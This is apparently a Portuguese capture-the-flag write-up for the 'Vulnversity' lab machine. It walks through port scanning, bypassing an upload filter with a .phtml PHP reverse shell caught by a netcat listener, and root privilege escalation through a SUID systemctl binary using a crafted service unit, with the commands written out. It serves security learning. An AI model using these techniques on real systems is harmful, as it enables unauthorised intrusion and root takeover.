## Recon — Vulnversity

* **Comando:** `nmap -p- 10.64.149.186`
* **Portas abertas:** 21 (FTP), 22 (SSH), 139 (netbios-ssn), 445 (microsoft-ds), 3128 (squid-http), 3333 (http)

### 1. Enumeração Web

* A análise do serviço HTTP na porta `3333` revelou uma aplicação web.
* Execução de *fuzzing* de diretórios (GoBuster/ffuf) identificou o endpoint oculto `/internal/`, que contém um formulário de upload de arquivos.

### 2. Ganho de Acesso Inicial (Initial Access)

* **Vulnerabilidade:** Unrestricted File Upload / Bypass de Extensão.
* **Mecanismo:** A aplicação bloqueia ficheiros com extensão `.php`. A enumeração de extensões permitidas confirmou que a extensão `.phtml` é aceite e interpretada pelo servidor Apache.
* **Exploração:**
1. Upload de uma *reverse shell* PHP renomeada para `shell.phtml`.
2. Execução de *listener* Netcat na máquina atacante (`nc -lvnp 4444`).
3. Acesso direto a `[http://10.64.149.186:3333/internal/uploads/shell.phtml](http://10.64.149.186:3333/internal/uploads/shell.phtml)` para disparar a conexão.


* **Acesso obtido:** Shell interativa como o utilizador do servidor web (`www-data`).
* **User Flag:** `/home/bill/user.txt`

---

## Escalada de Privilégios (Privilege Escalation)

### 1. Identificação do Vetor

* Enumeração de binários no sistema com o bit **SUID** ativo:
```bash
find / -type f -perm -04000 -ls 2>/dev/null

```


* **Anomalia identificada:** O binário `/bin/systemctl` foi localizado com permissões SUID (`-rwsr-xr-x`) pertencentes ao utilizador `root`.

### 2. Exploração do SUID no Systemd

Como o `systemctl` permite registrar e gerir serviços no sistema com privilégios de `root`, foi criado um ficheiro de serviço temporário em `/tmp` para executar comandos arbitrários no contexto de superutilizador.

* **Criação da unidade de serviço temporária (`privservice`):**
```bash
PRIV_SERVICE=$(mktemp /tmp/privserviceXXXXX.service)

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
[Install]
WantedBy=multi-user.target' > $PRIV_SERVICE

```


* **Ativação e Execução:**
```bash
/bin/systemctl link $PRIV_SERVICE
/bin/systemctl start $PRIV_SERVICE

```



### 3. Impacto e Leitura da Flag

* O serviço executou o comando com privilégios `root`, copiando o conteúdo restrito de `/root/root.txt` para `/tmp/root.txt`.
* Leitura da flag efetuada com sucesso: `cat /tmp/root.txt`.
